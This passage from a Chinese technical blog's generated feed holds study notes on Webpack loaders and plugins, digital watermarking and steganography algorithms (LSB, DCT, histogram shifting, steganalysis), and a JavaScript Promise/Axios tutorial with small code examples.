title="问题"></a>问题</h5><ul><li>Loader是什么？要求的输出是什么？</li><li>Loader的链式调用是什么意思？如何串联多个loader？</li><li>Loader中如何处理异步场景？</li></ul><h2 id="七、理解插件"><a href="#七、理解插件" class="headerlink" title="七、理解插件"></a>七、理解插件</h2><blockquote><p>很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？</p></blockquote><ul><li>心智成本高=&gt;可维护性低=&gt;生命力弱</li><li>插件架构精髓：对拓展开发，对修改封闭；</li><li>Webpack很多功能都是基于插件的概念实现；</li></ul><h3 id="1-使用插件"><a href="#1-使用插件" class="headerlink" title="1.使用插件"></a>1.使用插件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//引入插件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DashboardPlugin</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-dashboard/plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-comment">//添加插件实例</span><br>    <span class="hljs-attr">plugins</span>:[<span class="hljs-keyword">new</span> <span class="hljs-title class_">DashboardPlugin</span>()];<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-编写插件"><a href="#2-编写插件" class="headerlink" title="2.编写插件"></a>2.编写插件</h3><h5 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SomePlugin</span>&#123;<br>    <span class="hljs-title function_">apply</span>(<span class="hljs-params">complier</span>)&#123;<br>        complier.<span class="hljs-property">hooks</span>.<span class="hljs-property">thisCompilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;SomePlugin&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">compilation</span>)=&gt;</span>&#123;<br>            <br>        &#125;)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；</li><li>上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；</li><li>交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；</li></ul><h5 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h5><ul><li>Loader与插件有什么区同点？</li><li>钩子有什么作用？如何监听钩子函数？</li></ul><h2 id="八、学习方法"><a href="#八、学习方法" class="headerlink" title="八、学习方法"></a>八、学习方法</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/979e56c5c207eac0.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/452e2397f71ff64e.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数字水印</title>
    <link href="/2022/10/29/%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/"/>
    <url>/2022/10/29/%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="数字水印"><a href="#数字水印" class="headerlink" title="数字水印"></a>数字水印</h1><h3 id="一、基本原理"><a href="#一、基本原理" class="headerlink" title="一、基本原理"></a>一、基本原理</h3><h4 id="1-背景"><a href="#1-背景" class="headerlink" title="1.背景"></a>1.背景</h4><p>信息隐藏：  伪装通信、隐秘传输；</p><p>数字水印：  版权保护；</p><p>区别：</p><table><thead><tr><th></th><th>信息隐藏</th><th>数字水印</th></tr></thead><tbody><tr><td>目标</td><td>隐藏信息</td><td>承载标记</td></tr><tr><td>精准度</td><td>精确</td><td>不需要</td></tr><tr><td>健壮</td><td>一般</td><td>强</td></tr></tbody></table><h5 id="特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；"><a href="#特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；" class="headerlink" title="特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；"></a>特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；</h5><p>安全、可证明、不可感知、健壮</p><h4 id="2-健壮性衡量量"><a href="#2-健壮性衡量量" class="headerlink" title="2.健壮性衡量量"></a>2.健壮性衡量量</h4><ul><li>数据压缩处理</li><li>滤波、平滑处理</li><li>量化和增强</li><li>几何失真</li></ul><h5 id="算法组成"><a href="#算法组成" class="headerlink" title="算法组成"></a>算法组成</h5><p>水印的加载（打标记）   水印的检测（检测标记）</p><h5 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h5><p>水印：（1）有效信息；（2）随机序列；</p><h5 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h5><p>$$<br>W’=F(I,W,K)        W’是水印本体；I是载体；<br>$$</p><p>$$<br>Iw=E(I,W’)    嵌入<br>$$</p><p>$$<br>W*=D(Iw,I,K)    提取过程<br>$$</p><h4 id="3-假设检验原则"><a href="#3-假设检验原则" class="headerlink" title="3.假设检验原则"></a>3.假设检验原则</h4><p>虚警率：不存在但是被检测出来</p><p>漏检率：存在但是没有检测出来（Better Small）</p><p>总错误率=虚警率+漏检率</p><h4 id="4-分类"><a href="#4-分类" class="headerlink" title="4.分类"></a>4.分类</h4><h5 id="载体上："><a href="#载体上：" class="headerlink" title="载体上："></a>载体上：</h5><ul><li>静止图像水印</li><li>视频水印</li><li>音频水印</li><li>软件水印</li><li>文档水印</li></ul><h5 id="外观上"><a href="#外观上" class="headerlink" title="外观上"></a>外观上</h5><ol><li>可见</li><li>不可见</li></ol><h5 id="加载方法上"><a href="#加载方法上" class="headerlink" title="加载方法上"></a>加载方法上</h5><ul><li>空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法</li><li>变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换</li></ul><h5 id="检测方法分类"><a href="#检测方法分类" class="headerlink" title="检测方法分类"></a>检测方法分类</h5><p>私有和公开水印；私钥和公钥水印；</p><h5 id="特性上"><a href="#特性上" class="headerlink" title="特性上"></a>特性上</h5><p>健壮性：标志保护；        脆弱性：完整性保护；</p><h5 id="使用目的上"><a href="#使用目的上" class="headerlink" title="使用目的上"></a>使用目的上</h5><p>版权标识水印：版权认证标识；</p><p>数字指纹水印：防止非法拷贝；</p><h4 id="5-失真度衡量方法"><a href="#5-失真度衡量方法" class="headerlink" title="5.失真度衡量方法"></a>5.失真度衡量方法</h4><p>主观性能：等级划分；</p><p>客观性能：平均绝对差分；        信噪比 SNR   峰值信噪比 PSNR</p><h3 id="二、数字水印"><a href="#二、数字水印" class="headerlink" title="二、数字水印"></a>二、数字水印</h3><h4 id="1-数字水印本体"><a href="#1-数字水印本体" class="headerlink" title="1.数字水印本体"></a>1.数字水印本体</h4><h5 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h5><p>能够验证；鲁棒性；</p><h5 id="表示形式"><a href="#表示形式" class="headerlink" title="表示形式"></a>表示形式</h5><ul><li>一窜有意义的字符；</li><li>一窜伪随机序列；</li><li>一个可视图片；</li></ul><h5 id="（1）有意义字符方式"><a href="#（1）有意义字符方式" class="headerlink" title="（1）有意义字符方式"></a>（1）有意义字符方式</h5><p>包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；</p><h5 id="（2）伪随机数列"><a href="#（2）伪随机数列" class="headerlink" title="（2）伪随机数列"></a>（2）伪随机数列</h5><p>标识信息与伪随机数列对应；对伪随机序列进行嵌入；</p><p>提取端通过相关性检测判断水印存在与否；鲁棒性好；</p><h5 id="（3）可是图像的数字水印"><a href="#（3）可是图像的数字水印" class="headerlink" title="（3）可是图像的数字水印"></a>（3）可是图像的数字水印</h5><p>签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；</p><h4 id="2-数字水印框架"><a href="#2-数字水印框架" class="headerlink" title="2.数字水印框架"></a>2.数字水印框架</h4><p>$$<br>嵌入 –&gt; 提取（提取的结果可以是水印本身，也可以是相关判决）<br>$$</p><p><img src="https://s3.bmp.ovh/imgs/2022/10/28/3c7f6c8aac6aed77.png"></p><h3 id="三、基于空间域的图像水印关键算法"><a href="#三、基于空间域的图像水印关键算法" class="headerlink" title="三、基于空间域的图像水印关键算法"></a>三、基于空间域的图像水印关键算法</h3><h4 id="1-最低有效位替换的数字水印嵌入方法"><a href="#1-最低有效位替换的数字水印嵌入方法" class="headerlink" title="1.最低有效位替换的数字水印嵌入方法"></a>1.最低有效位替换的数字水印嵌入方法</h4><p><img src="https://s3.bmp.ovh/imgs/2022/10/28/0856e991541651bf.png"></p><h4 id="2-图像拼凑数字水印方法–嵌入位置选择"><a href="#2-图像拼凑数字水印方法–嵌入位置选择" class="headerlink" title="2.图像拼凑数字水印方法–嵌入位置选择"></a>2.图像拼凑数字水印方法–嵌入位置选择</h4><p>安全性考虑、载体质量的影响考虑；</p><h5 id="拼凑算法嵌入位置选择"><a href="#拼凑算法嵌入位置选择" class="headerlink" title="拼凑算法嵌入位置选择"></a>拼凑算法嵌入位置选择</h5><ul><li>K密钥-&gt;伪随机数-&gt;选择n个像素对；<br>a类+1，而b类-1；计算S=Σ(a-b);<br>如果S=2n,则判断嵌入1，如果等于0，嵌入0；</li></ul><h4 id="3-基于心理视觉的嵌入位置选择"><a href="#3-基于心理视觉的嵌入位置选择" class="headerlink" title="3.基于心理视觉的嵌入位置选择"></a>3.基于心理视觉的嵌入位置选择</h4><p>多在纹理复杂，或者边缘地区嵌入；</p><p>（1）P18</p>]]></content>
    
    
    <categories>
      
      <category>数字水印</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字水印</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图像信号处理基础</title>
    <link href="/2022/10/29/%E5%9B%BE%E5%83%8F%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/10/29/%E5%9B%BE%E5%83%8F%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="图像信号处理基础"><a href="#图像信号处理基础" class="headerlink" title="图像信号处理基础"></a>图像信号处理基础</h1><h3 id="一、图像信号基础"><a href="#一、图像信号基础" class="headerlink" title="一、图像信号基础"></a>一、图像信号基础</h3><h4 id="1-图像表示"><a href="#1-图像表示" class="headerlink" title="1.图像表示"></a>1.图像表示</h4><p>像素点</p><h4 id="2-图像压缩方法"><a href="#2-图像压缩方法" class="headerlink" title="2.图像压缩方法"></a>2.图像压缩方法</h4><p>JPEG等；</p><p><img src="https://s3.bmp.ovh/imgs/2022/10/28/b46fcc4dbfac830a.png"></p><h4 id="3-常用图像处理方法"><a href="#3-常用图像处理方法" class="headerlink" title="3.常用图像处理方法"></a>3.常用图像处理方法</h4><ul><li>二维DFT</li><li>二维DWT</li><li>二维DCT</li></ul><h3 id="二、信息隐藏基本原理"><a href="#二、信息隐藏基本原理" class="headerlink" title="二、信息隐藏基本原理"></a>二、信息隐藏基本原理</h3><h4 id="1-信息隐藏概念"><a href="#1-信息隐藏概念" class="headerlink" title="1.信息隐藏概念"></a>1.信息隐藏概念</h4><p>不可视通信，阈下通信<br>$$<br>C 载体对象；M 秘密信息； C’伪装对象；<br>$$<br><img src="https://s3.bmp.ovh/imgs/2022/10/28/810382446257649f.png"></p><p>纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；</p><h4 id="2-载体选择"><a href="#2-载体选择" class="headerlink" title="2.载体选择"></a>2.载体选择</h4><p>冗余空间、声音图像、载体样本使用次数仅1；</p><h3 id="三、信息隐藏技术"><a href="#三、信息隐藏技术" class="headerlink" title="三、信息隐藏技术"></a>三、信息隐藏技术</h3><h4 id="（一）时域替换技术"><a href="#（一）时域替换技术" class="headerlink" title="（一）时域替换技术"></a>（一）时域替换技术</h4><h4 id="1-LSB替换方法"><a href="#1-LSB替换方法" class="headerlink" title="1.LSB替换方法"></a>1.LSB替换方法</h4><p>将样点的最低比特位进行替换；</p><p>替换规则</p><p>同步</p><p>抗干扰<br>$$<br>载体空间{j1,j2.j3…jL(c)},L(c)是载体长度<br>$$</p><p>$$<br>嵌入信息空间{m1,m2,…,mL(m)}, L(c)是载体长度<br>$$</p><p>$$<br>伪装载体空间{j’1,j’2,…,j’L(c’)}   。。。载体长度<br>$$</p><h5 id="算法步骤："><a href="#算法步骤：" class="headerlink" title="算法步骤："></a>算法步骤：</h5><p>（1）嵌入过程</p><ul><li>根据L(m)值选择载体子集；</li><li>将载体子集的每个元素的最低比特位用mi替换；</li></ul><p>（2）提取过程</p><ul><li>找到位置，提取出来，重新排列成mi</li></ul><h5 id="嵌入点选择"><a href="#嵌入点选择" class="headerlink" title="嵌入点选择"></a>嵌入点选择</h5><ul><li>连续方法；</li><li>随机间隔；</li><li>伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；</li></ul><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>优点：简单易于实现，隐藏容量打；</p><p>缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；</p><p>改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；</p><h4 id="2-调色板图像隐藏方法"><a href="#2-调色板图像隐藏方法" class="headerlink" title="2.调色板图像隐藏方法"></a>2.调色板图像隐藏方法</h4><h5 id="图像的组成"><a href="#图像的组成" class="headerlink" title="图像的组成"></a>图像的组成</h5><p>直接像素；    调色板；</p><p>（1）调色板表数据：修改调色表值；</p><p>（2）实际图像点索引值：危险，相邻索引颜色差异会很大；</p><h5 id="灰度图三种颜色必须一起修改"><a href="#灰度图三种颜色必须一起修改" class="headerlink" title="灰度图三种颜色必须一起修改"></a>灰度图三种颜色必须一起修改</h5><p>优缺点：简单，健壮性差；</p><h4 id="3-基于量化编码"><a href="#3-基于量化编码" class="headerlink" title="3.基于量化编码"></a>3.基于量化编码</h4><h4 id="4-二值图像中的信息隐藏"><a href="#4-二值图像中的信息隐藏" class="headerlink" title="4.二值图像中的信息隐藏"></a>4.二值图像中的信息隐藏</h4><p>传真、徽标：冗余信息少；</p><h5 id="Zhao方法：特定区域中黑色图像的个数"><a href="#Zhao方法：特定区域中黑色图像的个数" class="headerlink" title="Zhao方法：特定区域中黑色图像的个数"></a>Zhao方法：特定区域中黑色图像的个数</h5><p>$$<br>区域内黑色数量大于1/2，嵌入0，否则嵌入1；<br>$$</p><p>不能修改太多，需要修改太多的设定为无效项；</p><h6 id="5-游程方法"><a href="#5-游程方法" class="headerlink" title="5.游程方法"></a>5.游程方法</h6><p>m为0，游程长度为偶数，m1，为奇数</p><h4 id="（二）变换域隐藏技术"><a href="#（二）变换域隐藏技术" class="headerlink" title="（二）变换域隐藏技术"></a>（二）变换域隐藏技术</h4><p>在载体重要部位隐藏，抗攻击，不可察觉；</p><h4 id="1-DCT变换"><a href="#1-DCT变换" class="headerlink" title="1.DCT变换"></a>1.DCT变换</h4><p>8*8块，安装Zig-Zag排列，最重要的在前面</p><p>隐藏方法：中频系数修改<br>$$<br>x’(i,j)=x(i,j)+am(i)<br>$$</p><p>$$<br>x’(i,j)=x(i,j)(1+am(i))<br>$$</p><p>需要原图像，经过相减除以a求出m</p><h5 id="利用特定数的相对大小来进行信息隐藏"><a href="#利用特定数的相对大小来进行信息隐藏" class="headerlink" title="利用特定数的相对大小来进行信息隐藏"></a>利用特定数的相对大小来进行信息隐藏</h5><p>伪随机选择<br>$$<br>Bi(u1,v2)   &gt;,     m=1<br>$$</p><p>$$<br>Bi(u2,v2)  &lt;,  m=0<br>$$</p><p>Note:</p><ul><li>当m值大小与m不一致时，大小关系互换；</li><li>互换影响太大就设定为无效项；</li><li>还有三项不等关系的方法；</li></ul><h4 id="2-DWT信息隐藏"><a href="#2-DWT信息隐藏" class="headerlink" title="2.DWT信息隐藏"></a>2.DWT信息隐藏</h4><h5 id="小波变换"><a href="#小波变换" class="headerlink" title="小波变换"></a>小波变换</h5><p>低频部分、水平细节、垂直细节、对角线细节</p><p>类似DCT系数隐藏的方法任然适用；</p><h5 id="图像隐藏算法"><a href="#图像隐藏算法" class="headerlink" title="图像隐藏算法"></a>图像隐藏算法</h5><ul><li>初始化</li><li>小波变换，主要是对低频分量进行隐藏</li><li>矢量量化，映射</li><li>加密和信息隐藏</li></ul><h4 id="3-DFT隐藏方法"><a href="#3-DFT隐藏方法" class="headerlink" title="3.DFT隐藏方法"></a>3.DFT隐藏方法</h4><p>参数有虚数实数，实数部分要求对称；</p><h4 id="4-回声隐藏算法"><a href="#4-回声隐藏算法" class="headerlink" title="4.回声隐藏算法"></a>4.回声隐藏算法</h4><h4 id="5-算法总结"><a href="#5-算法总结" class="headerlink" title="5.算法总结"></a>5.算法总结</h4><ul><li>加密强度高</li><li>健壮性好</li></ul><h4 id="（三）文件格式隐藏法"><a href="#（三）文件格式隐藏法" class="headerlink" title="（三）文件格式隐藏法"></a>（三）文件格式隐藏法</h4><h5 id="BMP文件格式隐藏"><a href="#BMP文件格式隐藏" class="headerlink" title="BMP文件格式隐藏"></a>BMP文件格式隐藏</h5><p>会改变文件大小</p><h4 id="（四）可逆信息隐藏实例"><a href="#（四）可逆信息隐藏实例" class="headerlink" title="（四）可逆信息隐藏实例"></a>（四）可逆信息隐藏实例</h4><h4 id="1-基于直方图平移的可逆信息隐藏"><a href="#1-基于直方图平移的可逆信息隐藏" class="headerlink" title="1.基于直方图平移的可逆信息隐藏"></a>1.基于直方图平移的可逆信息隐藏</h4><ul><li>确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；</li><li>直方图右移；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/10/29/51d92d5f22626ca7.png"></p><ul><li><p>针对直方图空隙进行信息嵌入，嵌入规则如下：<br>$$<br>若嵌入的bit为1,则将pp的值+1；<br>$$</p><p>$$<br>若嵌入的比特为0，则pp值不变；<br>$$</p><p>详细链接：</p><p><a href="https://blog.csdn.net/q15516221118/article/details/113617278">https://blog.csdn.net/q15516221118/article/details/113617278</a></p></li></ul><h3 id="三、信息隐藏分析"><a href="#三、信息隐藏分析" class="headerlink" title="三、信息隐藏分析"></a>三、信息隐藏分析</h3><h4 id="1-基本分析步骤"><a href="#1-基本分析步骤" class="headerlink" title="1.基本分析步骤"></a>1.基本分析步骤</h4><ol><li>检测是否藏有秘密信息；</li><li>如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；</li></ol><h4 id="2-发现隐藏信息"><a href="#2-发现隐藏信息" class="headerlink" title="2.发现隐藏信息"></a>2.发现隐藏信息</h4><ul><li><p>时域隐藏，变换域隐藏，统计等；</p></li><li><p>根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；</p></li><li><p>LSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；</p></li><li><p>调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；</p></li><li><p>变换域方法：尝试变换查找；</p></li><li><p>变形技术：主管分析；</p></li><li><p>载体生成技术：是否符合人类阅读习惯；</p></li><li><p>文件隐藏：文件大小是否异常；</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息隐藏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息隐藏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Axios详解</title>
    <link href="/2022/10/27/Axios%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/10/27/Axios%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h1><h4 id="基于promise可以用于浏览器和node-js的网络请求库"><a href="#基于promise可以用于浏览器和node-js的网络请求库" class="headerlink" title="基于promise可以用于浏览器和node.js的网络请求库"></a>基于promise可以用于浏览器和node.js的网络请求库</h4><h3 id="一、基础定义Promise"><a href="#一、基础定义Promise" class="headerlink" title="一、基础定义Promise"></a>一、基础定义Promise</h3><h4 id="1-promise"><a href="#1-promise" class="headerlink" title="1.promise"></a>1.promise</h4><p>一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。</p><figure class="highlight plaintext"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs visual"> 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回<br></code></pre></td></tr></table></figure><p>Promise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-comment">// 当参数a大于10且参数fn2是一个方法时 执行fn2</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn1</span>(<span class="hljs-params">a, fn2</span>) &#123;<br>    <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">10</span> &amp;&amp; <span class="hljs-keyword">typeof</span> fn2 == <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-title function_">fn2</span>()<br>    &#125;<br>&#125;<br><span class="hljs-title function_">fn1</span>(<span class="hljs-number">11</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;this is a callback&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。</p><p>这时候我们的promise就应运而生、粉墨登场了</p><p>promise主要解决两个问题：</p><ol><li><p>回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；</p></li><li><p>支持多个并发请求，并从请求中获取数据；可以解决异步的问题；</p><figure class="highlight plaintext"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs visual">建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~<br></code></pre></td></tr></table></figure></li></ol><h4 id="2-promise用法"><a href="#2-promise用法" class="headerlink" title="2.promise用法"></a>2.promise用法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class="hljs-comment">//一些异步操作</span><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Finished.&quot;</span>);<br>        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;成功！&quot;</span>)；<br>    &#125;，<span class="hljs-number">2000</span>)<br>&#125;)<br><br><span class="hljs-comment">//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：</span><br>resolve：异步操作执行成功之后的回调函数；<br>reject：异步操作执行失败后的回调函数；<br></code></pre></td></tr></table></figure><p>then 链式操作：</p><p>表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；</p><p>正确场景：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">p.<span class="hljs-title function_">then</span>((data))=&gt;&#123;<br>    cosnsole.<span class="hljs-title function_">log</span>(data);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>P&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>        &#125;);<br></code></pre></td></tr></table></figure><h4 id="3-reject用法"><a href="#3-reject用法" class="headerlink" title="3.reject用法"></a>3.reject用法</h4><p>把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> num=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()*<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span>(num&lt;=<span class="hljs-number">5</span>)<br>            &#123;<br>                <span class="hljs-title function_">resolve</span>(num);<br>            &#125;<span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-title function_">reject</span>(<span class="hljs-string">&quot;数字太大！&quot;</span>)；<br>                &#125;<br>    &#125;,<span class="hljs-number">2000</span>);<br>&#125;)；<br>p.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Resolved&quot;</span>,data);<br>&#125;,<span class="hljs-function">(<span class="hljs-params">err</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Rejected&quot;</span>,err);<br>&#125;<br>      )<br></code></pre></td></tr></table></figure><h4 id="4-catch用法"><a href="#4-catch用法" class="headerlink" title="4.catch用法"></a>4.catch用法</h4><p>catch和then的第二个参数一样用来指定reject的回调；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">p.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Resolved&quot;</span>,data);<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Rejected&quot;</span>,err);<span class="hljs-comment">//抛出异常</span><br>&#125;)<br><span class="hljs-comment">//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；</span><br>p.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;resolved&#x27;</span>,data);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(somedata); <span class="hljs-comment">//此处的somedata未定义</span><br>&#125;)<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;rejected&#x27;</span>,err);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-all的用法"><a href="#5-all的用法" class="headerlink" title="5.all的用法"></a>5.all的用法</h4><p>谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；</p><p>all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；</p><figure class="highlight js"><table><tr><td 